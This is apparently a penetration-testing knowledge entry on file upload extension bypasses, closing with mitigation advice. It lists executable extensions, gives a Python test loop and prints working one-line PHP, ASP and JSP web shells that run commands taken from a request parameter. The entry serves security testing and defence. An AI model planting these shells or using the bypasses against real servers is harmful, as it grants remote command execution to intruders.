# File Upload Malicious Extensions Testing

## Overview
- Purpose: Identify and test malicious file extensions that can be exploited in file upload vulnerabilities
- Category: web_security
- Severity: high
- Tags: file-upload, web-vulnerability, extension-filtering, bypass-techniques, OWASP-A4

## Context and Use-Cases
- Web applications often restrict file uploads by extension to prevent code execution
- Attackers can exploit insufficient extension filtering to upload executable files
- Testing multiple extension variations helps identify weak validation logic
- Common in file upload forms, avatar uploads, document management systems

## Procedure / Knowledge Detail

### 1. Server-Side Scripting Extensions
These extensions allow direct code execution on the server:

**PHP Extensions:**
- `.php` - Standard PHP executable
- `.php3`, `.php4`, `.php5` - Legacy PHP versions (sometimes still processed)
- `.phtml` - PHP HTML file
- `.pht` - PHP template

**ASP/ASP.NET Extensions:**
- `.asp` - Classic ASP
- `.aspx` - ASP.NET

**Java Extensions:**
- `.jsp` - JavaServer Pages
- `.jspx` - JSP XML variant

### 2. Script Execution Extensions
Other server-side scripting languages:
- `.py` - Python
- `.rb` - Ruby
- `.pl` - Perl
- `.cgi` - CGI scripts

### 3. System Command Extensions
Direct system command execution:
- `.sh` - Shell script (Unix/Linux)
- `.bat` - Batch file (Windows)
- `.cmd` - Command file (Windows)
- `.exe` - Executable (Windows)

## Examples

### Testing Malicious Extensions
```python
malicious_extensions = [
    ".php", ".php3", ".php4", ".php5", ".phtml", ".pht",
    ".asp", ".aspx", ".jsp", ".jspx",
    ".py", ".rb", ".pl", ".cgi",
    ".sh", ".bat", ".cmd", ".exe"
]

# Test each extension
for ext in malicious_extensions:
    filename = f"shell{ext}"
    # Attempt upload and verify if file is executable
```

### Web Shell Example
```php
<?php system($_GET['cmd']); ?>
```
This simple PHP shell allows remote command execution through GET parameter.

### ASP Web Shell Example
```asp
<%eval request("cmd")%>
```
Evaluates commands passed through HTTP requests.

### JSP Web Shell Example
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```
Executes system commands via Java Runtime.

## Detection and Mitigation
- Implement whitelist-based extension validation (not blacklist)
- Store uploaded files outside web root
- Disable script execution in upload directories
- Validate file content (magic bytes) not just extension
- Rename uploaded files to remove original extension
- Use Content-Disposition: attachment header
